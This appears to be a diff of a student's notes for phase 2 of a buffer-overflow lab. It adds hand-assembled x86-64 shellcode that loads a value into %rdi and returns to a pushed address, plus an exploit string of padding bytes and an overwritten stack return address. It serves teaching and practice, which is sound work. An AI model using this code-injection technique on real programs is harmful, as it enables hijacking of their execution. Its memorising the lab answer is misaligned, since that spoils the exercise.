@@ -34,19 +34,24 @@ unix> gcc -c example.s
 unix> objdump -d example.o > example.d
 
 
+
+
+# Example of hand-generated assembly code
+mov $0x59b997fa, %rdi # Push value onto stack
+pushq $0x004017ec
+retq
+
+
+48 c7 c7 fa 97 b9 59
+68 ec 17 40 00
+c3
+
 // phase_2
-
-AA AA AA AA AA AA AA AA
-AA AA AA AA AA AA AA AA
-AA AA AA AA AA AA AA c3 # ret
-00 40 17 ec c4 c7 48 00 # set rsp
-59 b9 97 fa c7 c7 48 00 # mov instruction
-98 dc 61 55 00 00 00 00 # ret address
-
-// will get file
-example.o: file format elf64-x86-64
-Disassembly of section .text:
-0000000000000000 <.text>:
-0: 68 ef cd ab 00 pushq $0xabcdef
-5: 48 83 c0 11 add $0x11,%rax
-9: 89 c2 mov %eax,%edx
+48 c7 c7 fa 97 b9 59
+68 ec 17 40 00
+c3
+51 51 51
+51 51 51 51 51
+51 51 51 51 51 51 51 51 51
+51 51 51 51 51 51 51 51 51 51
+78 dc 61 55 00 00 00 00
